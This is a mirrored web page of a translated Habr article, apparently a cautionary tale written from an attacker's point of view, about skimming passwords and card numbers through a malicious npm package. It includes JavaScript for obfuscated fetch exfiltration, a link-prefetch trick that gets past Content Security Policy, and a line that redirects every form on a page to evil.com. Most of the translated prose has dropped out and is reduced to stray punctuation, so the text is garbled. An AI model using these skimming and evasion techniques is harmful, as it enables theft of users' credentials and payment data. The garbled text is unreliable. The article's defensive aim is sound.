<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>The story of how I steal credit card numbers and passwords from visitors to your sites</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Continued: The story of how not to let me steal credit card numbers and passwords from visitors to your sites  We present you a translation of the art...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">🔎</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">📜</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">⬆️</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">⬇️</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>The story of how I steal credit card numbers and passwords from visitors to your sites</h1><div class="post__text post__text-html js-mediator-article"><blockquote>  Continued: <a href="https://habrahabr.ru/company/ruvds/blog/347958/">The story of how not to let me steal credit card numbers and passwords from visitors to your sites</a> </blockquote>  We present you a translation of the article of a person who has stolen usernames, passwords and credit card numbers from various sites for several years. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/wn/i8/9j/wni89jjkm9xtzxdr4ssuutfcvso.jpeg"></div><br>  What I want to tell about was in reality.  Or maybe my story is only based on real events.  And maybe all this is fiction. <br><br>  Once this week has stood out - an insane time when everyone was worried about security.  The feeling was that new vulnerabilities appear daily.  It was not so easy for me to pretend that I understand what is happening when close people asked me about it.  They were worried about the prospect that they would be hacked, that their data would flow to an unknown destination.  All this made me look at many things in a new way. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      As a result, reluctantly, I decided to put everything straight and tell the whole world how I stole usernames, passwords and credit card numbers from various websites over the past few years.  Perhaps you are the administrator or developer of one of them. <br><a name="habracut"></a><br><h2>  <font color="#3AC1EF">How it works</font> </h2><br>  By itself, the code that allows you to steal data from sites is very simple.  He feels best when executed on a page that meets the following criteria: <br><br><ul><li>    <code>&lt;form&gt;</code>.</li>
<li>  ,     <code>input[type="password"]</code>,  <code>name="cardnumber"</code>,  <code>name="cvc"</code>,   .</li>
<li>    «credit card», «checkout», «login», «password»,   .<br>
</li>
</ul><br>
,    <code>blur</code>         ,     <code>submit</code> ,    :<br>
<br>
<ul>
<li>     ,    (<code>document.forms.forEach(…)</code>).</li>
<li> <code>document.cookie</code>.</li>
<li>    ,       (<code>const payload = btoa(JSON.stringify(sensitiveUserData))</code>).</li>
<li>  ,  ,    : <code>https://legit-analytics.com?q=${payload}</code> ( , , ).<br>
</li>
</ul><br>
 ,       - ,      .<br>
<br>
<h2><font color="#3AC1EF"></font></h2><br>
,      ,  2015-, ,     ,     .        . ,    .<br>
<br>
 <a href="https://developers.google.com/web/fundamentals/security/csp/"> </a>  Google:<br>
<br>
<blockquote>    - - , ,    ,     .</blockquote><br>
      ?  XSS   ,      .  Chrome  .<br>
<br>
   ,    ,  ,     ,  ,   npm-.<br>
<br>
<h2><font color="#3AC1EF">NPM</font></h2><br>
,        npm.        — ,   - ,  -  ,     .<br>
<br>
  ,      —  ,     .    ,      ,  .    :<br>
<br>
<div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/b2d/da2/d2c/b2dda2d2c8bdcb2e6e98ad9a58c4cb14.png"></div><br>
 ,  , <a href="https://gist.github.com/davidgilbertson/6eae478d9a197bfa1b4dfbef38f787e5"> </a>.<br>
<br>
      ,       ,       ,     ,          .     -   ,       .<br>
<br>
     (  ,         )   -    . «,    X     ».<br>
<br>
   —     !     ,  ,      , ,      .    —  .<br>
<br>
     ,            23 .            —  ,  ,   .    ,      —   ,    .<br>
<br>
  —   .    6.<br>
<br>
      120000   ,     ,         ,  -   Alexa Top 1000,      ,      .<br>
<br>
   ,    ,        XSS-,      .         ,    -.<br>
<br>
<h2><font color="#3AC1EF">  ,     </font></h2><br>
-                  ,   ,   -      .   .<br>
<br>
<h3><font color="#3AC1EF">▍     !</font></h3><br>
    ?          (,     <a href="https://github.com/sindresorhus/devtools-detect/issues/15"></a>   ).<br>
<br>
   « »:      ,    .<br>
<br>
 ,         ,    IP-,       <code>dev</code>, <code>test</code>, <code>qa</code>, <code>uat</code>  <code>staging</code> (    <code>\b</code>).<br>
<br>
<h3><font color="#3AC1EF">▍          HTTP-!</font></h3><br>
    ?        7-   7- .    ,   95%     .<br>
<br>
       . ,  ,       ,      (    )        .     .<br>
<br>
  -        ,        ,        .            —     ,      ,   .<br>
<br>
 , URL        ,    , ,   .<br>
<br>
   ,  ,     ,  ,    .       , ,   ,        .  ,          .<br>
<br>
 .         ,  ,       ,   ,          - ,   ,      .         .<br>
<br>
<h3><font color="#3AC1EF">▍         GitHub!</font></h3><br>
  .   ,     :      GitHub,   —  npm.<br>
<br>
  <code>package.json</code>    <code>files</code> ,      <code>lib</code>,         .    <code>npm publish</code>   npm.   <code>lib</code>   <code>.gitignore</code>,      GitHub   .     ,            GitHub.<br>
<br>
 —   npm,          npm   GitHub,    ,  ,    <code>/lib/package.min.js</code> —     <code>/src/package.js</code>?<br>
<br>
 ,  GitHub     .<br>
<br>
<h3><font color="#3AC1EF">▍        node_modules!</font></h3><br>
,            . , ,  ,     ,        .<br>
<br>
  ,  ,  ,        .     <code>fetch</code>  <code>XMLHttpRequest</code>,   ,    .        :<br>
<br>
<pre><code>const i = 'gfudi';
const k = s =&gt; s.split('').map(c =&gt; String.fromCharCode(c.charCodeAt() - 1)).join('');
self[k(i)](urlWithYourPreciousData);</code></pre><br>
 «gfudi» —     «fetch»,      .      .  <code>self</code> —      <code>window</code>.<br>
<br>
        <code>fetch(...)</code>:<br>
<br>
<pre><code>self['\u0066\u0065\u0074\u0063\u0068'](...)</code></pre><br>
   ,   ,  ,      .<br>
<br>
 ,  ,  ,   ,   -    <code>fetch</code>.   ,   ,    <code>new EventSource(urlWithYourPreciousData)</code>.   ,        ,  <code>serviceWorker</code>    <code>fetch</code>,       .       ,  <code>serviceWorker</code>,   <code>EventSource</code>.<br>
<br>
<h3><font color="#3AC1EF">▍     !</font></h3><br>
,   .  -  ,     (Content Security Policy, CSP)        -  ?      ,    ,           CSP:<br>
<br>
<pre><code>const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);</code></pre><br>
      ,   CSP    () « 100%».  ,  ,      ,    130  .   ,      ,        .<br>
<br>
,       .      Chrome,   CSP          .<br>
<br>
    ,  <a href="https://www.w3.org/TR/CSP2/">CSP</a>  (,   )  ,        .         ,   ,     ,   CSP      ,       (  «»       —       GET).<br>
<br>
 ,      ,     prefetch,              .    ,    .<br>
<br>
 ,        ,  CSP,          (  <code>report-uri</code>). ,  ,      ,    ,  ,      .<br>
<br>
         (      ),   CSP   -      .<br>
<br>
    ,          .<br>
<br>
<pre><code>fetch(document.location.href)
.then(resp =&gt; {
 &nbsp;const csp = resp.headers.get('Content-Security-Policy');
 &nbsp;//    ?    ?
});</code></pre><br>
        CSP. ,       Google   CSP,           ,        .     <code>connect-src</code> ,  ,   « » <code>default-src</code>,      ,   , ,    .<br>
<br>
        —   ,          Google.<br>
<br>
 Amazon,   ,     ,   CSP.      eBay.<br>
<br>
 Twitter  PayPal  CSP,       .         , , ,    ,     .       ,    ,    ,  <code>default-src</code>.    —     ,     .    <code>form-action</code>.<br>
<br>
,       (   ),    ,   ,    <code>form-action</code>,       (  ,           )   .<br>
<br>
<pre><code>Array.from(document.forms).forEach(formEl =&gt; formEl.action = `//evil.com/bounce-form`);</code></pre><br>
 . , ,          PayPal.         ,     .<br>
<br>
,          ,       ,         .<br>
<br>
,   ,      Twitter     .   ,       .<br>
<br>
,     ,              .       ,     .<br>
<br>
<h2><font color="#3AC1EF"> ?</font></h2><br>
      ,    .<br>
<br>
<h3><font color="#3AC1EF">▍ №1:  ,  </font></h3><br>
,      :<br>
<br>
<div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/4ac/0c0/136/4ac0c0136f4487b5f25a3fe13da30aef.jpg"></div><br>
<i><font color="#999999">    .</font></i><br>
<br>
<h3><font color="#3AC1EF">▍ №2:      </font></h3><br>
  ,    ,       (   -),    npm.     Google Tag Manager,    ,   ,   —      .<br>
<br>
  <a href="https://news.ycombinator.com/item%3Fid%3D16084575"></a>,                  ,     iFrame.<br>
<br>
       ,    ,      React,   138 npm-. ,   ,      ,     iFrame,  ,     -    ,    JavaScript-,    (,   ,  ).<br>
<br>
     2017- ,   ,           .  ,     ,          .        ?<br>
<br>
   —   —   ,          12- ,     .<br>
<br>
<h2><font color="#3AC1EF"> </font></h2><br>
,     -    , , ,     . ,       i,  ,     npm-,     .   —   ,         .    —   ,   ,      .<br>
<br>
   ,     ,  ,   400000 npm-.  ,    ,           ,      ,      .<br>
<br>
    .      npm-,  <a href="https://www.npmjs.com/package/easy-ease"> </a>.          ,     ,      .     ,       ?<br>
<br>
<h2><font color="#3AC1EF"></font></h2><br>
     ?   ,   ,     ,   — ,     ?  . (, ,     ,    ,   —   ).<br>
<br>
  ( )   ,     ,   ,     , . ,     . ,        ,      .<br>
<br>
<b> !</b>     ,    -     ,   ?<br>
<br>
<a href="https://ruvds.com/ru-rub/"><img src="https://habrastorage.org/files/1ba/550/d25/1ba550d25e8846ce8805de564da6aa63.png"></a></div><p>Source: <a href="https://habr.com/ru/post/346442/">https://habr.com/ru/post/346442/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../346432/index.html">Easy “Frontend” on Golang for manual testing of Ethereum smart contract without JavaScript and Web3</a></li>
<li><a href="../346434/index.html">Nvidia drivers and telemetry</a></li>
<li><a href="../346436/index.html">S3 Storage Balancing with GoBetween + VRRP</a></li>
<li><a href="../346438/index.html">Twenty years with user experience: squeezing practical experience</a></li>
<li><a href="../346440/index.html">Just about the graphs. Attempt to popularize</a></li>
<li><a href="../346444/index.html">Meltdown & Specter vulnerabilities patches cause problems with downloading Ubuntu 16.04</a></li>
<li><a href="../346446/index.html">Data Modeling Zone EU 2017</a></li>
<li><a href="../346448/index.html">Financial Times: How Traders Try to Survive the HFT Trading Decline</a></li>
<li><a href="../346450/index.html">About honors on sober head</a></li>
<li><a href="../346452/index.html">Testing with JUnit 5 on Kotlin</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>